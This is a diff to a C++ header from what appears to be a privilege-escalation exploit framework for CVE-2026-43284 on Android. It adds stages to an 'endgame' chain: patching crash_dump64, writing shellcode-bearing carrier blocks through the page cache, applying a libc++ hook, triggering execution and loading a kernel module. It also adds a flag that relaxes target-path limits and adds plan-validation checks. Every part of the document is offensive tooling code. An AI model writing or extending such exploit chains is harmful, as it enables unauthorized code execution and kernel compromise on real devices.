@@ -79,6 +79,16 @@ namespace ghostlock::backend::cve_2026_43284::steps {
      * whitespace/control separators. */
     [[nodiscard]] bool valid_carrier_path(std::string_view path) noexcept;
 
+    /* Dev-only staged-run relaxation: the same structural constraints as
+     * valid_carrier_path (absolute, shorter than the 64-byte shellcode buffer,
+     * free of whitespace/control separators) but WITHOUT the /vendor or
+     * /system/vendor prefix requirement. It exists solely for the explicit
+     * --run-cve-2026-43284 --allow-dev-target staged entry to exercise the
+     * primitive on a one-shot file (for example under /data/local/tmp). It is
+     * never reachable from a profile, from build_carrier_list() or from the
+     * default pipeline, so the production carrier constraint stays intact. */
+    [[nodiscard]] bool valid_dev_carrier_path(std::string_view path) noexcept;
+
     /* Caller-owned carrier candidate buffer. add() rejects invalid paths and
      * keeps the first occurrence of a duplicate. */
     struct CarrierList final {
@@ -98,8 +108,13 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         Idle = 0U,
         ResolveTarget,
         ComputePlan,
+        /* patch #1: splicehelper -> crash_dump64@0 (before the carrier write,
+         * because the crash_dump read bridge depends on it). */
+        PatchCrashDump,
         Write,
         Verify,
+        /* libc++ sentry hook apply (after the carrier verify, before trigger). */
+        Hook,
         Trigger,
         WaitResult,
         Cleanup,
@@ -111,10 +126,18 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         NoCarrier,
         CarrierUnusable,
         InvalidPlan,
+        /* A planned region extends past the known target-file size: nothing
+         * of that region may be written. */
+        TargetOutOfBounds,
+        /* A caller-declared pre-image did not match the target's current
+         * content: the wrong or changed file, so nothing is written. */
+        PreImageMismatch,
         WriteFailed,
         ReadFailed,
         VerifyMismatch,
         RollbackFailed,
+        CrashDumpFailed,
+        HookFailed,
         TriggerFailed,
         LkmFailed,
         WaitTimeout,
@@ -139,11 +162,30 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         bool verify = true;
         bool rollback = true;
         std::string_view label{};
+        /* Optional pre-image assert (default off). When non-null it points at
+         * len bytes that must equal the target's current content over the whole
+         * region before its first byte is written. A mismatch fails the run
+         * with ChainError::PreImageMismatch. A null pointer keeps the legacy
+         * behaviour (no pre-image read). */
+        const std::uint8_t *preimage = nullptr;
     };
 
+    /* A patch plan must be internally closed: every region has to lie inside
+     * the plan's declared extent (when non-zero), the carrier's declared size
+     * (when non-zero) and the target file size (when known), and no two
+     * regions may overlap. extent == 0 leaves the total extent unspecified. */
     struct PatchPlan final {
         const PatchRegion *regions = nullptr;
         std::size_t region_count = 0U;
+        std::uint64_t extent = 0U;
+    };
+
+    /* How far run_chain() may advance. The device staged runner uses Write to
+     * validate the page-cache write + verify before any trigger fires; the
+     * default Full preserves the complete endgame. */
+    enum class ChainStopAfter : std::uint8_t {
+        Full = 0U,
+        Write,
     };
 
     struct ChainRequest final {
@@ -152,6 +194,19 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         /* Used when ChainOps::build_plan is null. */
         PatchPlan plan{};
         std::uint32_t wait_timeout_ms = 5000U;
+        ChainStopAfter stop_after = ChainStopAfter::Full;
+        /* Optional target-file size in bytes, normally from fstat(2) on the
+         * opened target (0 == unknown). When non-zero every planned region must
+         * satisfy offset + len <= target_size before any byte is written; a
+         * violation fails closed with ChainError::TargetOutOfBounds. */
+        std::uint64_t target_size = 0U;
+        /* Dev-only staged-run escape hatch, default false. When true run_chain
+         * validates carriers with valid_dev_carrier_path() instead of
+         * valid_carrier_path(), so a non-vendor one-shot target is accepted.
+         * Only the explicit --run-cve-2026-43284 --allow-dev-target entry sets
+         * it; build_carrier_list() and the default pipeline never do, so the
+         * default carrier constraint is unchanged. */
+        bool allow_dev_carrier_path = false;
     };
 
     /* Injected dependencies. Every function receives write.ctx as its ctx. The
@@ -165,10 +220,22 @@ namespace ghostlock::backend::cve_2026_43284::steps {
          * request's pre-computed plan is used. */
         bool (*build_plan)(void *ctx, PatchPlan &out, ChainError &error) noexcept = nullptr;
 
+        /* patch #1 (crash_dump64 <- splicehelper), before the carrier write.
+         * Optional: when null the stage is skipped. Return None on success. */
+        ChainError (*patch_crash_dump)(void *ctx) noexcept = nullptr;
+
         /* Reads one 16-byte block: 16 on success, or -errno. Required whenever
          * a region verifies or journals. */
         long (*read_block)(void *ctx, std::uint64_t offset,
                            std::uint8_t out[16]) noexcept = nullptr;
+
+        /* libc++ sentry hook apply, after the carrier verify. Optional; when
+         * null the stage is skipped. Return None on success. */
+        ChainError (*apply_hook)(void *ctx) noexcept = nullptr;
+
+        /* Unconditional hook restore, called in the terminus before release on
+         * every path. Optional. */
+        void (*restore_hook)(void *ctx) noexcept = nullptr;
 
         /* Launches the double-fork sentry trigger (B5-9). 0 == launched. */
         int (*trigger)(void *ctx) noexcept = nullptr;
@@ -221,8 +288,15 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         std::uint32_t blocks_rolled_back = 0U;
         bool lkm_loaded = false;
         bool cleanup_ran = false;
+        bool crash_dump_patched = false;
+        bool hook_applied = false;
+        bool hook_restored = false;
         bool journal_overflow = false;
         bool rollback_incomplete = false;
+        /* True once every region that declared a pre-image was read back and
+         * matched before its write. Always false when no pre-image was asked
+         * for, so diagnostics report preimage=absent in the default path. */
+        bool preimage_checked = false;
     };
 
     /* Runs the endgame chain. On success (error == None, lkm_loaded) every
@@ -235,6 +309,16 @@ namespace ghostlock::backend::cve_2026_43284::steps {
      * written (an old-block read failed); otherwise the failure is final. */
     [[nodiscard]] ChainResult run_chain(const ChainRequest &request, const ChainOps &ops,
                                         ChainWorkspace &workspace) noexcept;
+
+    /* Static closure check shared by run_chain(), apply_plan() and the staged
+     * runner. Validates block alignment, offset overflow, the plan's declared
+     * extent, the carrier's declared size and the target size, plus mutual
+     * region overlap. declared_extent and target_size are 0 when unknown.
+     * Returns ChainError::None when the plan is closed, TargetOutOfBounds for a
+     * region past target_size, and InvalidPlan for every other violation. */
+    [[nodiscard]] ChainError validate_plan_closure(const PatchPlan &plan,
+                                                   std::uint64_t declared_extent,
+                                                   std::uint64_t target_size) noexcept;
 
 } // namespace ghostlock::backend::cve_2026_43284::steps
 
